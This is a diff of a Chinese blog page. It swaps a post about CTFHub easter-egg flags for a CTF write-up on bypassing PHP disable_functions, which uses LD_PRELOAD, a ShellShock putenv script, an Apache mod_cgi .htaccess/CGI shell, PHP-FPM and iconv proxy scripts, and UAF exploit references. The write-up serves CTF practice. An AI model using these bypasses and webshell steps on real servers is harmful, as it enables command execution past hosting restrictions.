@@ -290,28 +290,211 @@
         
           <header class="entry-header">
             <h1 class="entry-title"></h1>
-            <p class="entry-census">&nbsp;·&nbsp;2022-8-28&nbsp;·&nbsp;<span id="busuanzi_value_page_pv"></span>次阅读</p></p>
+            <p class="entry-census">&nbsp;·&nbsp;2022-8-29&nbsp;·&nbsp;<span id="busuanzi_value_page_pv"></span>次阅读</p></p>
 
             <hr>
           </header>
         
         <div class="entry-content">
-          <h1 id="工具-彩蛋"><a href="#工具-彩蛋" class="headerlink" title="工具 彩蛋"></a>工具 彩蛋</h1><p>一开始的想法是工具一共有8页，想抓个包改下看看有没有第九页<br>抓包后发现不管哪一页limit都是12 但offset在变化<br>于是<br><img src="https://img-blog.csdnimg.cn/0b4b33ac483e49a9945a279bd42d7cd8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">这样设置参数<br><img src="https://img-blog.csdnimg.cn/f9fc1f1792d84ca193c1ac4910dfce25.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">在长度为1000到6、7千左右随便一个双击后 ==点击响应== 看==响应==包<br><img src="https://img-blog.csdnimg.cn/92c81d3b913d4800a9c19030d3079d7a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述">在最后一行</p>
-<h1 id="首页-彩蛋"><a href="#首页-彩蛋" class="headerlink" title="首页 彩蛋"></a>首页 彩蛋</h1><p><a href="https://api.ctfhub.com" target="_blank" rel="noopener">api</a>中间框内隐藏着两行字<br>ctfhub{c18732f48a96c40d40a06e74b1305706}<br><img src="https://img-blog.csdnimg.cn/42334be7914f498c96d55daecf1f09fb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
-<h1 id="题目入口-彩蛋"><a href="#题目入口-彩蛋" class="headerlink" title="题目入口 彩蛋"></a>题目入口 彩蛋</h1><p>在web-ssrf中间那一列的某些题传参错误时会出现<br>详情见<a href="https://blog.csdn.net/qq_62414126/article/details/122881838" target="_blank" rel="noopener">ctfhub-ssrf</a>post最后一行介绍</p>
-<h1 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h1><p>公众号彩蛋坑的一批！<br>首先要先绑定<br>然后点彩蛋<br>它提示要回复正确的关键词<br>我*#@%<br>我回复过</p>
+          <h2 id="Bypass-disable-function"><a href="#Bypass-disable-function" class="headerlink" title="Bypass disable_function"></a>Bypass disable_function</h2><h1 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h1><p>时间紧 于是先采用最省时的方法<br>先蚁剑连<br><img src="https://img-blog.csdnimg.cn/5939a50eab1c40fe8eff4ae65dc3b730.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现打不开flag文件<br>要使用蚁剑插件<code>绕过disabled function</code></p>
 <blockquote>
-<p>彩蛋    关键词    egg    ctfhub    CTFHub    拿来把你    CTFer 自己人 ……</p>
+<p>如果蚁剑插件市场打不开的话可以去github搜<br>github上有说明 按着他的安</p>
 </blockquote>
-<p>到底没想到竟然是flag</p>
-<h1 id="投稿提交-彩蛋"><a href="#投稿提交-彩蛋" class="headerlink" title="投稿提交 彩蛋"></a>投稿提交 彩蛋</h1><p>只找到了前半部分<br>分别在题目提交和wp提交页面的最后</p>
-<pre><code class="css">ctfhub{029e02eb3a1
-    e8c49b1132b5
-    15b652a5f3a8
-    62013}
+<p>连上之后在蚁剑主页面右键webshell使用该插件<br>按照步骤操作<br>成功后把webshell地址改为http://……/.antproxy.php<br>在连上就能tac了<br><code>tac /flag</code></p>
+<h1 id="ShellShock"><a href="#ShellShock" class="headerlink" title="ShellShock"></a>ShellShock</h1><p>进去发现连不上<br>查了下大佬博客说是环境不正常<br>原理如下</p>
+<blockquote>
+<p>如果环境变量的值以字符() {开头，那么这个变量就会被当作是一个导入函数的定义（Export），这种定义只有在shell启动的时候才生效。</p>
+</blockquote>
+<p>脚本</p>
+<pre><code class="php">&lt;?php
+$cmd = &quot; tac /flag&gt;/var/www/html/1.txt&quot;;
+putenv(&quot;PHP_DMIND=() { :; };$cmd&quot;);
+error_log(&quot;dmind&quot;,1); 
+echo file_get_contents(&quot;/var/www/html/1.txt&quot;);
+?&gt;
 </code></pre>
-<p>最后这个彩蛋剩余部分也没找到<br>网上搜了下才明白：感谢anweilx的<a href="https://www.cnblogs.com/anweilx/p/12493000.html" target="_blank" rel="noopener">wp</a><br>第一行是俩页面的最后有<br>第二行是在俩页面源码 分别搜==奖励== 在上面那行一个是base64然后再转url 一个是hex解码<br>第三行是俩页面的图片隐写 丢进winhex<br>第四行有提示<br>aes 256 ecb<a href="http://tool.chacuo.net/cryptaes/" target="_blank" rel="noopener">解码</a></p>
-<h1 id="其他彩蛋"><a href="#其他彩蛋" class="headerlink" title="其他彩蛋"></a>其他彩蛋</h1><p>剩余皆可在对应页面搜索egg即可获得</p>
+<p>用蚁剑传进去后<br>浏览器访问这个文件即可在1.txt看到flag<br><img src="https://img-blog.csdnimg.cn/3d91c09a976d423dac82102531093e0c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h1 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a>Apache Mod CGI</h1><p><img src="https://img-blog.csdnimg.cn/b725c6e6ac734ae483c2f7810f7d639d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<p>如果.htaccess文件被攻击者修改的话，攻击者就可以利用apache的mod_cgi模块，直接绕过PHP的任何限制，来执行系统命令</p>
+<blockquote>
+<p>1.Mod CGI就是把PHP做为APACHE一个内置模块，让apache http服务器本身能够支持PHP语言，不需要每一个请求都通过启动PHP解释器来解释PHP.<br>2.它可以将cgi-script文件或者用户自定义标识头为cgi-script的文件通过服务器运行.<br>3.在.htaccess文件中可定制用户定义标识头<br>4.添加Options +ExecCGI，代表着允许使用mod_cgi模块执行CGI脚本<br>5.添加AddHandler cgi-script .cgi，代表着包含.cgi扩展名的文件都将被视为CGI程序</p>
+</blockquote>
+<p>条件</p>
+<ol>
+<li>必须是apache环境</li>
+<li>mod_cgi已经启用</li>
+<li>必须允许.htaccess文件，也就是说在httpd.conf中，要注意AllowOverride选项为All，而不是none</li>
+<li>必须有权限写.htaccess文件</li>
+</ol>
+<h2 id="脚本："><a href="#脚本：" class="headerlink" title="脚本："></a>脚本：</h2><p>.htaccess</p>
+<pre><code class="handlebars">Options +ExecCGI
+AddHandler cgi-script .cgi   
+</code></pre>
+<p>shell.cgi</p>
+<pre><code class="shell">#!/bin/sh
+echo&amp;&amp;cd &quot;/var/www/html/backdoor&quot;;cat shell.cgi;echo 96642;pwd;echo c26b314f4b
+</code></pre>
+<h2 id="简单方法："><a href="#简单方法：" class="headerlink" title="简单方法："></a>简单方法：</h2><p>蚁剑连<br>还是那个插件bypass！<br><img src="https://img-blog.csdnimg.cn/62979eb3a1e84ce580aad7229184b420.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<h1 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h1><ol>
+<li>FPM是fast-cgi的协议解析器</li>
+<li>webserver使用cgi协议封装好用户的请求发送给FPM</li>
+<li>FPM按照cgi的协议将TCP流解析成真正的数据</li>
+</ol>
+<p><img src="https://img-blog.csdnimg.cn/fd9b0f38878649ae853da3e31f36780c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>蚁剑bypass<br>模式：FPM<br>地址：127.0.0.1：9000或localhost：9000<br>植入后修改shell地址为http://……/.antproxy.php</p>
+<pre><code class="php">&lt;?php
+function get_client_header(){
+    $headers=array();
+    foreach($_SERVER as $k=&gt;$v){
+        if(strpos($k,&#39;HTTP_&#39;)===0){
+            $k=strtolower(preg_replace(&#39;/^HTTP/&#39;, &#39;&#39;, $k));
+            $k=preg_replace_callback(&#39;/_\w/&#39;,&#39;header_callback&#39;,$k);
+            $k=preg_replace(&#39;/^_/&#39;,&#39;&#39;,$k);
+            $k=str_replace(&#39;_&#39;,&#39;-&#39;,$k);
+            if($k==&#39;Host&#39;) continue;
+            $headers[]=&quot;$k:$v&quot;;
+        }
+    }
+    return $headers;
+}
+function header_callback($str){
+    return strtoupper($str[0]);
+}
+function parseHeader($sResponse){
+    list($headerstr,$sResponse)=explode(&quot;
+&quot;,$sResponse, 2);
+    $ret=array($headerstr,$sResponse);
+    if(preg_match(&#39;/^HTTP/1.1 d{3}/&#39;, $sResponse)){
+        $ret=parseHeader($sResponse);
+    }
+    return $ret;
+}
+set_time_limit(120);
+$headers=get_client_header();
+$host = &quot;127.0.0.1&quot;;
+$port = 61921;
+$errno = &#39;&#39;;
+$errstr = &#39;&#39;;
+$timeout = 30;
+$url = &quot;/index.php&quot;;
+if (!empty($_SERVER[&#39;QUERY_STRING&#39;])){
+    $url .= &quot;?&quot;.$_SERVER[&#39;QUERY_STRING&#39;];
+};
+$fp = fsockopen($host, $port, $errno, $errstr, $timeout);
+if(!$fp){
+    return false;
+}
+$method = &quot;GET&quot;;
+$post_data = &quot;&quot;;
+if($_SERVER[&#39;REQUEST_METHOD&#39;]==&#39;POST&#39;) {
+    $method = &quot;POST&quot;;
+    $post_data = file_get_contents(&#39;php://input&#39;);
+}
+$out = $method.&quot; &quot;.$url.&quot; HTTP/1.1\r\n&quot;;
+$out .= &quot;Host: &quot;.$host.&quot;:&quot;.$port.&quot;\r\n&quot;;
+if (!empty($_SERVER[&#39;CONTENT_TYPE&#39;])) {
+    $out .= &quot;Content-Type: &quot;.$_SERVER[&#39;CONTENT_TYPE&#39;].&quot;\r\n&quot;;
+}
+$out .= &quot;Content-length:&quot;.strlen($post_data).&quot;\r\n&quot;;
+$out .= implode(&quot;\r\n&quot;,$headers);
+$out .= &quot;\r\n\r\n&quot;;
+$out .= &quot;&quot;.$post_data;
+fputs($fp, $out);
+$response = &#39;&#39;;
+while($row=fread($fp, 4096)){
+    $response .= $row;
+}
+fclose($fp);
+$pos = strpos($response, &quot;\r\n\r\n&quot;);
+$response = substr($response, $pos+4);
+echo $response;
+</code></pre>
+<h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><h2 id="GC"><a href="#GC" class="headerlink" title="GC"></a>GC</h2><blockquote>
+<p>利用的是PHP Garbage Collector程序中的堆溢出触发</p>
+</blockquote>
+<p><a href="https://bugs.php.net/bug.php?id=72530" target="_blank" rel="noopener">题目附件</a><br><em>其实蚁剑的reference就有这附件 包括后面的大佬脚本</em><br>可以用蚁剑一把梭<br><img src="https://img-blog.csdnimg.cn/d187ee0e20c14aaca8350fb68dc9c622.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
+<p>另附<br>==<a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">大佬poc</a>==<br>UAF的脚本里面都有<br>==tql！==</p>
+<h2 id="Json-Serializer-UAF"><a href="#Json-Serializer-UAF" class="headerlink" title="Json Serializer UAF"></a>Json Serializer UAF</h2><blockquote>
+<p>漏洞利用json在序列化中的堆溢出触发bypass，漏洞为bug #77843</p>
+</blockquote>
+<p>蚁剑一把梭</p>
+<h2 id="Backtrace-UAF"><a href="#Backtrace-UAF" class="headerlink" title="Backtrace UAF"></a>Backtrace UAF</h2><blockquote>
+<p>漏洞利用的是 debug_backtrace这个函数，可以利用该函数的漏洞返回已经销毁的变量的引用达成堆溢出，漏洞为bug #76047</p>
+</blockquote>
+<h1 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h1><p><a href="https://www.laruence.com/2020/03/11/5475.html" target="_blank" rel="noopener">PHP FFI详解</a></p>
+<blockquote>
+<p>==<strong>disabled function:</strong>==<br>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv</p>
+</blockquote>
+<h1 id="iconv"><a href="#iconv" class="headerlink" title="iconv"></a>iconv</h1><ul>
+<li>github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/9/</li>
+<li><a href="https://gist.github.com/LoadLow/90b60bd5535d6c3927bb24d5f9955b80" target="_blank" rel="noopener">https://gist.github.com/LoadLow/90b60bd5535d6c3927bb24d5f9955b80</a></li>
+</ul>
+<pre><code class="php">&lt;?php
+function get_client_header(){
+    $headers=array();
+    foreach($_SERVER as $k=&gt;$v){
+        if(strpos($k,&#39;HTTP_&#39;)===0){
+            $k=strtolower(preg_replace(&#39;/^HTTP/&#39;, &#39;&#39;, $k));
+            $k=preg_replace_callback(&#39;/_\w/&#39;,&#39;header_callback&#39;,$k);
+            $k=preg_replace(&#39;/^_/&#39;,&#39;&#39;,$k);
+            $k=str_replace(&#39;_&#39;,&#39;-&#39;,$k);
+            if($k==&#39;Host&#39;) continue;
+            $headers[]=&quot;$k:$v&quot;;
+        }
+    }
+    return $headers;
+}
+function header_callback($str){
+    return strtoupper($str[0]);
+}
+function parseHeader($sResponse){
+    list($headerstr,$sResponse)=explode(&quot;
+&quot;,$sResponse, 2);
+    $ret=array($headerstr,$sResponse);
+    if(preg_match(&#39;/^HTTP/1.1 d{3}/&#39;, $sResponse)){
+        $ret=parseHeader($sResponse);
+    }
+    return $ret;
+}
+set_time_limit(120);
+$headers=get_client_header();
+$host = &quot;127.0.0.1&quot;;
+$port = 63947;
+$errno = &#39;&#39;;
+$errstr = &#39;&#39;;
+$timeout = 30;
+$url = &quot;/index.php&quot;;
+if (!empty($_SERVER[&#39;QUERY_STRING&#39;])){
+    $url .= &quot;?&quot;.$_SERVER[&#39;QUERY_STRING&#39;];
+};
+$fp = fsockopen($host, $port, $errno, $errstr, $timeout);
+if(!$fp){
+    return false;
+}
+$method = &quot;GET&quot;;
+$post_data = &quot;&quot;;
+if($_SERVER[&#39;REQUEST_METHOD&#39;]==&#39;POST&#39;) {
+    $method = &quot;POST&quot;;
+    $post_data = file_get_contents(&#39;php://input&#39;);
+}
+$out = $method.&quot; &quot;.$url.&quot; HTTP/1.1\r\n&quot;;
+$out .= &quot;Host: &quot;.$host.&quot;:&quot;.$port.&quot;\r\n&quot;;
+if (!empty($_SERVER[&#39;CONTENT_TYPE&#39;])) {
+    $out .= &quot;Content-Type: &quot;.$_SERVER[&#39;CONTENT_TYPE&#39;].&quot;\r\n&quot;;
+}
+$out .= &quot;Content-length:&quot;.strlen($post_data).&quot;\r\n&quot;;
+$out .= implode(&quot;\r\n&quot;,$headers);
+$out .= &quot;\r\n\r\n&quot;;
+$out .= &quot;&quot;.$post_data;
+fputs($fp, $out);
+$response = &#39;&#39;;
+while($row=fread($fp, 4096)){
+    $response .= $row;
+}
+fclose($fp);
+$pos = strpos($response, &quot;\r\n\r\n&quot;);
+$response = substr($response, $pos+4);
+echo $response;
+</code></pre>
 
         </div>
         <!-- .entry-content -->
@@ -343,7 +526,7 @@
           
             <div class="post-nepre half previous">
           
-            <a href="/2022/08/免密ssh登录/" rel="prev">
+            <a href="/2022/08/ctfhub-rce/" rel="prev">
               <div class="background">
                 <img class="lazyload" src="/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
               </div>
@@ -361,7 +544,7 @@
           
             <div class="post-nepre half next">
           
-            <a href="/2022/08/hello-world/" rel="next">
+            <a href="/2022/08/免密ssh登录/" rel="next">
               <div class="background">
                 <img class="lazyload" src="/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
               </div>
@@ -369,7 +552,7 @@
               Next Post</span>
               <div class="info">
                 <h3>
-                Hello World</h3>
+                </h3>
                 <hr>
               </div>
             </a>
